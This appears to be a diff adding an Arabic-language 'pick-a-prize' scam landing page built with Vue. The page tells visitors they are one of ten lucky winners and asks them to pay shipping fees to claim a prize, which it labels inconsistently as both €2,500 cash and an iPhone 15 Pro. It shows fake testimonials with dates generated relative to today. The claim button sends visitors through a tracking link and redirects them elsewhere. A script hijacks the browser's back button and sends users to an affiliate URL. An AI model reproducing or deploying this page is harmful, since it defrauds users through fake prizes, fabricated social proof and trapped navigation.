@@ -1,0 +1,183 @@
+<!doctype html>
+<html lang="ar" dir="ltr">
+
+<head>
+    <title>تهانينا</title>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="shortcut icon" href="data:image/x-icon" type="image/x-icon">
+    <link href="landers/pick-a-prize/assets/app.css" type="text/css" rel="stylesheet" />
+</head>
+
+<body class="theme--default">
+
+    <main id="app" v-cloak>
+        <div class="header">
+            <img class="header__menu" src="landers/pick-a-prize/assets/img/menu.svg" alt="Menu">
+            <img class="header__logo" src="landers/pick-a-prize/assets/img/logo/default.svg" alt="Image" />
+            <img class="header__account" src="landers/pick-a-prize/assets/img/account.svg" alt="Account">
+        </div>
+        <div class="content">
+            <div v-if="!showPrize">
+                <h1 class="title title--h1">
+                    🥳 تهانينا 🥳
+                </h1>
+                <p class="paragraph">
+                    لقد تم اختيارك للحصول على هدية خاصة
+                </p>
+                <p class="paragraph">
+                    اختر هديتك الخاصة أدناه واتبع التعليمات للمطالبة بها
+                </p>
+                <prize-picker button-text="يختار" button-selected-text="فاز" button-hover-color="#00c853" :disabled="!!selected" class="prize-picker" v-on:selected="receiveSelected">
+                    <template v-slot:prize1>
+              <img
+                v-show="!selected"
+                key="1"
+                src="landers/pick-a-prize/assets/img/chest.jpg"
+                class="prize-picker__image prize-picker__image--placeholder"
+                alt=""
+              >
+              <img
+                v-show="selected === 1"
+                key="2"
+                src="img/prizes/cash-2500-usd/nl/default@0.5x.png"
+                class="prize-picker__image"
+                alt="/€2,500.00 Cash"
+              />
+              <img
+                v-show="selected && selected !== 1"
+                key="3"
+                src="landers/pick-a-prize/assets/img/chest.jpg"
+                class="prize-picker__image prize-picker__image--placeholder"
+                alt="/€2,500.00 Cash"
+              />
+            </template>
+                    <template v-slot:prize2>
+              <img
+                v-show="!selected"
+                src="landers/pick-a-prize/assets/img/chest.jpg"
+                class="prize-picker__image prize-picker__image--placeholder"
+                alt=""
+              >
+              <img
+                v-show="selected === 2"
+                src="img/prizes/cash-2500-usd/nl/default@0.5x.png"
+                class="prize-picker__image" alt="/€2,500.00 Cash"
+                alt=""
+              />
+              <img
+                v-show="selected && selected !== 2"
+                src="landers/pick-a-prize/assets/img/chest.jpg"
+                class="prize-picker__image prize-picker__image--placeholder"
+                alt="/€2,500.00 Cash"
+              />
+            </template>
+                    <template v-slot:prize3>
+              <img
+                v-show="!selected"
+                src="landers/pick-a-prize/assets/img/chest.jpg"
+                class="prize-picker__image prize-picker__image--placeholder"
+                alt=""
+              />
+              <img
+                v-show="selected === 3"
+                src="img/prizes/cash-2500-usd/nl/default@0.5x.png"
+                class="prize-picker__image" alt="/€2,500.00 Cash"
+                alt=""
+              />
+              <img
+                v-show="selected && selected !== 3"
+                src="landers/pick-a-prize/assets/img/chest.jpg"
+                class="prize-picker__image prize-picker__image--placeholder"
+                alt="/€2,500.00 Cash"
+              />
+            </template>
+                </prize-picker>
+            </div>
+            <div class="prize" v-else>
+                <h2 class="title title--h2">مكافأتك</h2>
+                <img class="prize__image" src="img/prizes/cash-2500-usd/nl/default@0.5x.png" alt="">
+                <div class="prize__name">
+                  💵 ‏   ايفون 15 برو💵
+                </div>
+                <p class="paragraph">
+                  ‏تهانينا، لقد أصبحت أحد المستخدمين العشرة المحظوظين:
+                </p>
+                <p class="paragraph">
+                  ‏ما عليك سوى دفع رسوم الشحن الأساسية للحصول على نسخة تجريبية.
+                </p>
+                <span class="prize__button">
+                  <a href="https://2qumuk.mcgo2.com/click" target="_blank" onclick="setTimeout(function() { window.location = 'https://nearby-massage.top'; }, 100);">اقبل المكافأة➡️</a>
+                </span>
+            </div>
+            <div class="testimonials">
+                <h2 class="testimonials__title">قاعة المشاهير</h2>
+                <prize-comment avatar="img/profiles/mena/female/3@0.25x.jpg" name="تالا حقّ" :date="`${DateHelper().getMonthName({ days: -1 })} ${DateHelper().getDate({ days: -1 })}, ${DateHelper().getYear({ days: -1 })}`" message=":‏لم يتم استلام الهدية حتى اليوم التالي، لكنها حقيقية."></prize-comment>
+                <prize-comment avatar="img/profiles/mena/male/3@0.25x.jpg" name="خالد البخاري‎" :date="`${DateHelper().getMonthName({ days: -2 })} ${DateHelper().getDate({ days: -2 })}, ${DateHelper().getYear({ days: -2 })}`" message=":‏وصلتني اليوم، أنا سعيد جدا!"></prize-comment>
+                <prize-comment avatar="img/profiles/mena/male/10@0.25x.jpg" name="محمد المري" :date="`${DateHelper().getMonthName({ days: -2 })} ${DateHelper().getDate({ days: -2 })}, ${DateHelper().getYear({ days: -2 })}`" message=":‏لا توجد جائزة لي... هل يمكنني الحصول على فرصة أخرى؟"></prize-comment>
+                <prize-comment avatar="img/profiles/mena/female/6@0.25x.jpg" name="ريم ˈالشطي" :date="`${DateHelper().getMonthName({ days: -3 })} ${DateHelper().getDate({ days: -3 })}, ${DateHelper().getYear({ days: -3 })}`" message=":‏لقد فزت!! موافق!"></prize-comment>
+                <prize-comment avatar="img/profiles/mena/male/9@0.25x.jpg" name="أحمد لطيف" :date="`${DateHelper().getMonthName({ days: -4 })} ${DateHelper().getDate({ days: -4 })}, ${DateHelper().getYear({ days: -4 })}`" message=":‏لقد فزت! واووووو"></prize-comment>
+                <prize-comment avatar="img/profiles/mena/female/5@0.25x.jpg" name="لين حكيمي‎" :date="`${DateHelper().getMonthName({ days: -4 })} ${DateHelper().getDate({ days: -4 })}, ${DateHelper().getYear({ days: -4 })}`" message=":‏هذا مذهل لا أستطيع الانتظار للعب!"></prize-comment>
+                <prize-comment avatar="img/profiles/mena/female/1@0.25x.jpg" name="تاليا المري" :date="`${DateHelper().getMonthName({ days: -6 })} ${DateHelper().getDate({ days: -6 })}, ${DateHelper().getYear({ days: -6 })}`" message=":‏وصفني بالخاسر المؤلم، لأنني أردت ذلك حقًا!"></prize-comment>
+                <prize-comment avatar="img/profiles/mena/male/2@0.25x.jpg" name="عمر ˈالشطي" :date="`${DateHelper().getMonthName({ days: -7 })} ${DateHelper().getDate({ days: -7 })}, ${DateHelper().getYear({ days: -7 })}`" message=":‏كان ذلك سهلاً للغاية، لقد فزت!!!!"></prize-comment>
+                <prize-comment avatar="img/profiles/mena/male/6@0.25x.jpg" name="عبدالله ˈالقزاح" :date="`${DateHelper().getMonthName({ days: -8 })} ${DateHelper().getDate({ days: -8 })}, ${DateHelper().getYear({ days: -8 })}`" message=":‏لم أفز بأي شيء أبدًا، لكن أتمنى أن أكون محظوظًا!"></prize-comment>
+                <prize-comment avatar="img/profiles/mena/male/8@0.25x.jpg" name="يوسف عطية‎" :date="`${DateHelper().getMonthName({ days: -9 })} ${DateHelper().getDate({ days: -9 })}, ${DateHelper().getYear({ days: -9 })}`" message=":‏فزت أنا وزوجتي بالجائزة، وهو أمر رائع حقًا، هاها!"></prize-comment>
+            </div>
+        </div>
+        <div class="loader" v-show="selected && !showPrize">
+            <div class="loader__dual-ring"></div>
+        </div>
+    </main>
+    <script>
+        window.view = window.view || {};
+        view.datetimeTranslations = {
+            "ago": ":time ago",
+            "from_now": ":time from now",
+            "after": ":time after",
+            "before": ":time before",
+            "year": "1 year|:count years",
+            "month": "1 month|:count months",
+            "week": "1 week|:count weeks",
+            "day": "1 day|:count days",
+            "hour": "1 hour|:count hours",
+            "minute": "1 minute|:count minutes",
+            "second": "1 second|:count seconds",
+            "january": "January",
+            "february": "February",
+            "march": "March",
+            "april": "April",
+            "may": "May",
+            "june": "June",
+            "july": "July",
+            "august": "August",
+            "september": "September",
+            "october": "October",
+            "november": "November",
+            "december": "December",
+            "monday": "Monday",
+            "tuesday": "Tuesday",
+            "wednesday": "Wednesday",
+            "thursday": "Thursday",
+            "friday": "Friday",
+            "saturday": "Saturday",
+            "sunday": "Sunday"
+        };
+    </script>
+    <script>
+      // 当页面加载完成时，立即向history栈添加一个状态
+      history.pushState(null, null, location.href);
+      
+      window.onpopstate = function(event) {
+          // 这里处理用户点击浏览器后退按钮的情况
+          // 重定向用户到指定页面, 比如 Google
+          location.href = 'https://www.greatfinds.click/?a=251749&c=347376&co=311409&mt=16';
+          // 或者重定向用户到他们之前的页面
+          // history.go(-1);
+      }
+  </script>
+    <script type="application/javascript" src="landers/pick-a-prize/assets/app.js"></script>
+</body>
+
+</html>
